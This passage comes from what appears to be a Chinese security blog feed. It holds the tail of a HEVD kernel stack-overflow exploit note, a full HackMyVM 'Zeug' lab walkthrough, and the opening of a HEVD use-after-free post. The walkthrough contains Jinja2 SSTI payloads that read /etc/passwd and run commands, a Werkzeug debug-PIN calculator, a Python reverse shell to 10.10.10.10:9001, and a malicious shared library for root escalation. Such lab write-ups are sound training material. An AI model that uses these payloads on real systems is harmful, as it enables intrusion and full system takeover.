PageDirectoryBase;</span><br><span class="line">	VM_COUNTERS VirtualMemoryCounters;</span><br><span class="line">	SIZE_T PrivatePageCount;</span><br><span class="line">	IO_COUNTERS IoCounters;</span><br><span class="line">	SYSTEM_EXTENDED_THREAD_INFORMATION Threads[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_EXTENDED_PROCESS_INFORMATION, * PSYSTEM_EXTENDED_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å­˜åœ¨ä¸€ä¸ªNumberOfThreadçš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥éå†<code>SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];</code>æ¥è·å¾—StackBaseå’ŒStackLimit</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_EXTENDED_THREAD_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">    SYSTEM_THREAD_INFORMATION ThreadInfo;</span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID Win32StartAddress;</span><br><span class="line">    PVOID TebBase; <span class="comment">// since VISTA</span></span><br><span class="line">    ULONG_PTR Reserved2;</span><br><span class="line">    ULONG_PTR Reserved3;</span><br><span class="line">    ULONG_PTR Reserved4;</span><br><span class="line">&#125; SYSTEM_EXTENDED_THREAD_INFORMATION, * PSYSTEM_EXTENDED_THREAD_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>securityCookieåœ¨æ¨¡å—ä¸­çš„ä½ç½®ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">0000000140003010</span> ; <span class="type">uintptr_t</span> _security_cookie</span><br><span class="line">.data:<span class="number">0000000140003010</span> __security_cookie dq <span class="number">2B</span>992DDFA232h </span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« æŒ‡å‡ºï¼Œæ¯æ¬¡è§¦å‘é©±åŠ¨çš„ handler å‡½æ•°æ—¶ï¼Œä¸€å®šä¼šè°ƒç”¨Â <code>nt!NtDeviceIoControlFile</code>Â å‡½æ•°ï¼Œå¹¶ä¸”è¿”å›åœ°å€åœ¨Â <code>nt!NtDeviceIoControlFile+0x56</code>ã€‚</p>
<p>TriggerStackOverflowä¸è·å¾—æ ˆçš„åŸºå€åç§»æ˜¯å¦ç›¸åŒï¼Ÿå¤šè·‘å‡ æ¬¡</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Python&gt;<span class="number">0xfffff88b1fdbf000</span><span class="number">-0xfffff88b1fdc44b0</span></span><br><span class="line"><span class="number">-0x54b0</span></span><br><span class="line"></span><br><span class="line">Python&gt;<span class="number">0xfffff88b1dc8d000</span><span class="number">-0xfffff88b1dc924b0</span></span><br><span class="line"><span class="number">-0x54b0</span></span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥è·å¾—rspåœ°å€</p>
<p>memmoveæ—¶å¯„å­˜å™¨çš„å€¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">RAX: <span class="number">0000000000000000</span>   RBX: <span class="number">0000000000000000</span>   RCX: FFFFEC8EDD1724D0   </span><br><span class="line">RDX: <span class="number">00000250870E0000</span>   RSI: <span class="number">0000000000000008</span>   RDI: <span class="number">00000250870E0000</span>   </span><br><span class="line">RIP: FFFFF801211467E4   RSP: FFFFEC8EDD1724B0   RBP: FFFFAC01F21BCE50   </span><br><span class="line">R8:  <span class="number">0000000000000008</span>   R9:  <span class="number">000000000000004</span>D   R10: <span class="number">0000000000000000</span>   </span><br><span class="line">R11: FFFFEC8EDD1724A8   R12: <span class="number">0000000000000200</span>   R13: FFFFAC01F2AC9E10   </span><br><span class="line">R14: <span class="number">000000000000004</span>D   R15: <span class="number">0000000000000003</span> </span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›´æ¥å†™å…¥ï¼Œæ ˆæº¢å‡ºè§¦å‘Exceptionï¼Œç›´æ¥å´©æºƒ</p>
<ul>
<li>ç¼“å†²åŒºå¤ªå¤§äº†ï¼ˆ0x1000ï¼‰åæ¥æŠŠç¼“å†²åŒºè¯¥å°ä¸€ç‚¹(0x270)ï¼Œå‘ç°æ˜¯å¯ä»¥</li>
</ul>
<p>çœ‹äº†å‡ ç¯‡æ–‡ç« ï¼Œä½¿ç”¨äº†ä¿®æ”¹é¡µè¡¨çš„æ–¹å¼ bypass SMEPï¼Œæœ‰æ—¶é—´å­¦ä¹ ä¸€ä¸‹</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://github.com/vportal/HEVD">HEVD exploits for Windows 10</a></li>
<li><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10</a></li>
<li>[HEVD exploit ç³»åˆ—] StackOverflowGS](<a href="https://www.zoemurmure.top/posts/hevd_stackoberflowgs/">https://www.zoemurmure.top/posts/hevd_stackoberflowgs/</a>)</li>
<li><a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">Windows x64 åˆ†é¡µæœºåˆ¶</a></li>
</ul>
]]></content>
      <categories>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Zeug</title>
    <url>/2024/02/22/HMV%20Zeug/</url>
    <content><![CDATA[<blockquote>
<p>æ‰“ä¸ªé¶æœº</p>
</blockquote>
<span id="more"></span>

<h2 id="æ‰«æ"><a href="#æ‰«æ" class="headerlink" title="æ‰«æ"></a>æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nmap -p- --min-rate=10000 &lt;IP&gt;</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.124.6</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">5000/tcp open  upnp</span><br><span class="line">MAC Address: 08:00:27:8D:5E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Thu Feb 22 10:23:52 2024 -- 1 IP address (1 host up) scanned in 66.37 seconds</span></span><br><span class="line"></span><br><span class="line">$ <span class="variable">$sudo</span> nmap -p21,5000 -sCV &lt;IP&gt;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.124.13</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/3.0.1 Python/3.11.2</span><br><span class="line">|     Date: Thu, 22 Feb 2024 05:56:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 549</span><br><span class="line">|     Connection: close</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure>

<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>anonymous ç™»å½•ï¼Œè·å¾—READMEæ–‡ä»¶</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ftp&gt; get README.md</span><br><span class="line"></span><br><span class="line">$ cat README.txt</span><br><span class="line">Hi, Cosette, don&#x27;t forget to disable the debug mode in the web application, we don&#x27;t want security breaches.</span><br></pre></td></tr></table></figure>
<h2 id="Werkzeug-WEB"><a href="#Werkzeug-WEB" class="headerlink" title="Werkzeug WEB"></a>Werkzeug WEB</h2><h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>ç»“åˆæç¤ºï¼Œå¯èƒ½æ˜¯DEBUGæ¨¡å¼ã€‚è®¿é—® <code>/console</code> è·¯ç”±ï¼Œä½†æ˜¯éœ€è¦ <code>PIN</code></p>
<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ htmlæ–‡ä»¶è§£æï¼Œä½†æ˜¯å­˜åœ¨ <code>SSTI</code>ï¼Œ<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection">PayloadsAllTheThings</a></p>
<p>ç½‘ç«™è®¾ç½®äº†é»‘åå•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;  <span class="comment"># [] subclasses</span></span><br><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__ &#125;&#125;  <span class="comment"># init</span></span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;  <span class="comment"># os popen</span></span><br></pre></td></tr></table></figure>

<h3 id="PINç "><a href="#PINç " class="headerlink" title="PINç "></a>PINç </h3><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">Werkzeug &#x2F; Flask Debug - HackTricks</a></p>
<p>ç»“åˆæºç ï¼Œå…¶è®¡ç®—machin_id çš„å½“æ—¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; <span class="built_in">str</span> | <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; <span class="built_in">str</span> | <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br></pre></td></tr></table></figure>

<ol>
<li>Username. <code>/etc/passwd : cosette</code></li>
<li>Full path of the app. <code>/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</code></li>
<li>MAC address of the target machine. <code>/sys/class/net/enp0s3/address =&gt; 08:00:27:8d:5e:6d =&gt; 8796756598381</code></li>
<li>Machine ID : <code>/etc/machine-id=&gt;48329e233f524ec291cce7479927890b</code> &amp;&amp; <code>/proc/sys/kernel/random/boot_id=&gt;901d0a34-e4f9-4a52-8a83-3840d0c0bfb1</code> &amp;&amp; <code>/proc/self/cgroup=&gt;0::/system.slice/zeug-app.service</code>).</li>
</ol>
<p>è®¡ç®—PINç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;cosette&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;8796756598381&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;48329e233f524ec291cce7479927890bzeug-app.service&#x27;</span>  </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"><span class="comment"># h.update(b&#x27;shittysalt&#x27;)</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>


<p>ç„¶åå¾—åˆ°PINç ï¼Œè¿›å…¥DEBUGç»ˆç«¯ï¼Œä½¿ç”¨python reverse shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.10&quot;</span>,<span class="number">9001</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å‡çº§pty</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">(inside the nc session) </span><br><span class="line">CTRL+Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span>; <span class="built_in">ls</span>; <span class="built_in">export</span> SHELL=/bin/bash; <span class="built_in">export</span> TERM=screen; <span class="built_in">stty</span> rows 38 columns 116; reset;</span><br></pre></td></tr></table></figure>


<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>å¯ä»¥æ‰§è¡Œseedç¨‹åº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cosette@zeug:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> cosette on zeug:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User cosette may run the following commands on zeug:</span><br><span class="line">    (exia) NOPASSWD: /home/exia/seed</span><br></pre></td></tr></table></figure>

<p>seed_bak: å¤‡ä»½ï¼Œè¿™é‡Œæ˜¯ä¸ªä¼ªéšæœºæ•°ï¼Œv5æ˜¯ä¸ªå›ºå®šå€¼<code>0x6b8b4567</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ˜ç¡®çš„å¾—åˆ°ç­”æ¡ˆ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">banner</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">srand</span>(<span class="number">1u</span>);</span><br><span class="line">  v5 = <span class="built_in">rand</span>();</span><br><span class="line">  v6 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a number: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == (v5 ^ v4) )</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¾“å…¥å¯†ç è·å¾—shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u exia /home/exia/seed</span><br></pre></td></tr></table></figure>

<p>ææƒåˆ°root</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exia@zeug:/dev/shm$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> exia on zeug:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User exia may run the following commands on zeug:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/zeug</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="built_in">main</span>(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">dlopen</span>(<span class="string">&quot;/home/exia/exia.so&quot;</span>, <span class="number">2</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fwrite</span>(<span class="string">&quot;Error opening file\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x13</span>uLL, _bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dlopen ï¼š<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path">Linux Privilege Escalation</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"><span class="comment">// sudo -u root /usr/bin/zeug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HMV</category>
      </categories>
      <tags>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD-UAF</title>
    <url>/2024/02/07/HEVD%20UAF/</url>
    <content><![CDATA[<blockquote>
<p>Windows Kernel NonPagedPool UAF</p>
</blockquote>
<span id="more"></span>

<p>win10 22h2</p>
<p>ç›¸å…³ä»£ç åœ¨ä»“åº“<a href="https://github.com/Ha0-Y/HEVDExploits">HEVDExploits</a></p>
<h2 id="ç¼–è¯‘é¡¹ç›®"><a href="#ç¼–è¯‘é¡¹ç›®" class="headerlink" title="ç¼–è¯‘é¡¹ç›®"></a>ç¼–è¯‘é¡¹ç›®</h2><p>è¿è¡Œ<code>Builder/Build_HEVD_Vulnerable_x64.bat</code></p>
<p>æˆ–è€…VSæ‰“å¼€é¡¹ç›®ï¼Œç¼–è¯‘ã€‚</p>
<ul>
<li>å±æ€§-&gt;DriverSetting å…ˆè®¾ç½®ä¸ºwin7&#x2F;win10ï¼Œç”Ÿæˆx64</li>
</ul>
<h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p><code>#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)</code>Â æ˜¯ä¸€ä¸ªç”¨äºåœ¨Windowså†…æ ¸å¼€å‘ä¸­æŒ‡å®šå‡½æ•°æ‰€å±ä»£ç æ®µå±æ€§çš„ç¼–è¯‘æŒ‡ä»¤ã€‚</p>
<ul>
<li><code>#pragma alloc_text</code>Â æ˜¯ä¸€ä¸ªé¢„å¤„ç†æŒ‡ä»¤ï¼Œç”¨äºåœ¨ç¼–è¯‘æ—¶å°†å‡½æ•°æŒ‡å®šåˆ°ç‰¹å®šçš„ä»£ç æ®µã€‚</li>
<li><code>PAGE</code>Â æ˜¯<code>#pragma alloc_text</code>Â æŒ‡ä»¤åé¢çš„å‚æ•°ï¼Œç”¨äºæŒ‡å®šå‡½æ•°æ‰€å±çš„ä»£ç æ®µã€‚<code>PAGE</code>Â è¡¨ç¤ºè¯¥å‡½æ•°åº”è¯¥è¢«ç¼–è¯‘ä¸ºé€‚ç”¨äºé¡µç é¡µé¢çš„ä»£ç æ®µã€‚</li>
</ul>
<p>ExAllocatePoolWithTag: åˆ†é…æŒ‡å®šç±»å‹çš„æ± å†…å­˜ï¼Œå¹¶è¿”å›æŒ‡å‘å·²åˆ†é…å—çš„æŒ‡é’ˆ</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">POOL_TYPE (wdm.h)</a></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,         <span class="comment">// è¦åˆ†é…çš„æ± å†…å­˜çš„ç±»å‹ï¼ŒPOOL_TYPE æšä¸¾</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,    <span class="comment">// è¦åˆ†é…çš„å­—èŠ‚æ•°</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag               <span class="comment">// è¦ç”¨äºå·²åˆ†é…å†…å­˜çš„æ± æ ‡è®°ï¼Œå­—ç¬¦ä¸²é€šå¸¸æŒ‰åå‘é¡ºåºæŒ‡å®š</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br></pre></td></tr></table></figure>

<p>windows å†…å­˜ç®¡ç†å™¨åˆ›å»ºç³»ç»Ÿç”¨äºåˆ†é…å†…å­˜çš„ä»¥ä¸‹å†…å­˜æ± ï¼šéåˆ†é¡µæ± å’Œåˆ†é¡µæ± ã€‚ è¿™ä¸¤ä¸ªå†…å­˜æ± éƒ½ä½äºä¸ºç³»ç»Ÿä¿ç•™å¹¶æ˜ å°„åˆ°æ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„åœ°å€ç©ºé—´åŒºåŸŸä¸­ã€‚å†…æ ¸æ± ç±»ä¼¼äºWindows ä¸­çš„å †, å› ä¸ºå®ƒçš„ä½œç”¨ä¹Ÿæ˜¯ç”¨æ¥åŠ¨æ€åˆ†é…å†…å­˜</p>
<ul>
<li>éåˆ†é¡µæ± ç”±è™šæ‹Ÿå†…å­˜åœ°å€ç»„æˆï¼Œåªè¦åˆ†é…äº†ç›¸åº”çš„å†…æ ¸å¯¹è±¡ï¼Œè¿™äº›åœ°å€å°±ä¿è¯é©»ç•™åœ¨ç‰©ç†å†…å­˜ä¸­ã€‚ </li>
<li>åˆ†é¡µæ± ç”±è™šæ‹Ÿå†…å­˜ç»„æˆï¼Œå¯ä»¥åˆ†é¡µè¿›å‡ºç³»ç»Ÿã€‚</li>
<li><strong>PagedPool</strong>ç®€å•æ¥è¯´å°±æ˜¯ç‰©ç†å†…å­˜ä¸å¤Ÿæ—¶ï¼Œä¼šæŠŠè¿™ç‰‡å†…å­˜ç§»åŠ¨åˆ°ç¡¬ç›˜ä¸Šï¼Œè€Œ<strong>NonPagedPool</strong>æ˜¯æ— è®ºç‰©ç†å†…å­˜å¦‚ä½•ç´§ç¼ºï¼Œéƒ½ç»å¯¹ä¸æŠŠè¿™ç‰‡å†…å­˜çš„å†…å®¹ç§»åŠ¨åˆ°ç¡¬ç›˜ä¸Šã€‚</li>
</ul>
<p>ExFreePoolWithTag: é‡Šæ”¾æ± å†…å­˜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExFreePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID P,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

